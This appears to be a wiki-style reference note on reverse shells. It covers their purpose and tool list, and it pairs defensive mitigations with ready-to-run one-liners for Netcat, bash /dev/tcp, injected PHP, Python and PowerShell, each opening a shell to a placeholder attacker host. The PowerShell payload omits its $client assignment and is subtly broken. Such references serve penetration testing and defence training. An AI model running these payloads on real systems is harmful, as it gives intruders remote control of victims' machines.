## Overview
A reverse shell is a type of shell in which the target machine connects back to the attacker's machine, providing the attacker with remote control over the target. Reverse shells are commonly used in hacking and penetration testing to bypass firewalls and NAT, allowing attackers to execute commands on a compromised system.

## Features
- **Outbound Connection:** The target initiates the connection to the attacker's machine, making it more likely to bypass firewalls.
- **Remote Command Execution:** Provides remote access to the target machine's shell, allowing for command execution.
- **Stealth:** Outbound connections are less likely to be blocked or monitored compared to inbound connections.
- **Flexible:** Can be written in various programming languages and utilized across different operating systems.

## Website
- [Reverse Shell Cheat Sheet by Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## Common Reverse Shell Techniques

### 1. **Netcat Reverse Shell**
   - **Description:** Uses Netcat, a simple networking utility, to create a reverse shell.
   - **Exploitation:**
     - **Listener (Attacker Machine):**
		```sh
nc -lvnp 4444
```
     - **Target Machine (Linux):**
     ```sh
nc -e /bin/bash attacker_ip 4444
```
     - **Target Machine (Windows):**
     ```sh
nc.exe -e cmd.exe attacker_ip 4444
```
   - **Mitigation:** Monitor for unauthorized outbound connections and block unneeded ports with a firewall.

### 2. **Bash Reverse Shell**
   - **Description:** Uses bash, a common Unix shell, to create a reverse shell.
   - **Exploitation:**
     - **Listener (Attacker Machine):**
     ```sh
nc -lvnp 4444
```
     - **Target Machine:**
     ```sh
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```
   - **Mitigation:** Restrict the execution of bash scripts and monitor for abnormal outbound traffic.

### 3. **PHP Reverse Shell**
   - **Description:** Utilizes PHP code to initiate a reverse shell, often used in web application attacks.
   - **Exploitation:**
     - **Listener (Attacker Machine):**
     ```sh
nc -lvnp 4444
```
     - **Target Machine (Inject PHP Code):**
     ```php
     <?php system("nc -e /bin/bash attacker_ip 4444"); ?>
```
   - **Mitigation:** Disable dangerous PHP functions like `system()`, `exec()`, and `shell_exec()`, and use web application firewalls (WAFs).

### 4. **Python Reverse Shell**
   - **Description:** Leverages Python's `socket` and `subprocess` libraries to create a reverse shell.
   - **Exploitation:**
     - **Listener (Attacker Machine):**
     ```sh
nc -lvnp 4444
     ```
     - **Target Machine:**
     ```python
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("attacker_ip",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"]);'
     ```
   - **Mitigation:** Limit Python execution capabilities and monitor for suspicious outbound connections.

### 5. **PowerShell Reverse Shell**
   - **Description:** Uses PowerShell, a powerful scripting language on Windows, to create a reverse shell.
   - **Exploitation:**
     - **Listener (Attacker Machine):**
     ```sh
nc -lvnp 4444
     ```
     - **Target Machine:**
     ```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("attacker_ip",4444);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
     ```
   - **Mitigation:** Restrict PowerShell execution policies, use AppLocker or Windows Defender Application Control (WDAC), and monitor for unusual PowerShell activity.

## Tools for Reverse Shells

- **[[Netcat]]:** A versatile networking utility often used for reverse shells.
- **[[Metasploit]]:** Includes modules for creating and handling reverse shells in various languages.
- **[[Ncat]]:** An enhanced version of Netcat that supports encryption and IPv6.
- **[[Socat]]:** A more powerful alternative to Netcat, supporting SSL and many other protocols.
- **[[PowerShell Empire]]:** A post-exploitation framework that uses PowerShell for reverse shells and other attacks.

## Best Practices
- **Use Firewalls:** Implement strict outbound filtering to prevent unauthorized reverse shell connections.
- **Monitor Network Traffic:** Use intrusion detection systems (IDS) and intrusion prevention systems (IPS) to detect reverse shell traffic patterns.
- **Harden Endpoints:** Disable unnecessary scripting languages and tools like PowerShell and Python on sensitive systems.
- **Educate Users:** Train users to recognize suspicious activities that could lead to reverse shell attacks, such as phishing emails and malicious downloads.
- **Keep Systems Updated:** Regularly update software and operating systems to mitigate vulnerabilities that could be exploited for reverse shells.

## References
- [Reverse Shell Cheat Sheet by Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Metasploit Unleashed - Reverse Shells](https://www.offensive-security.com/metasploit-unleashed/reverse-shell/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

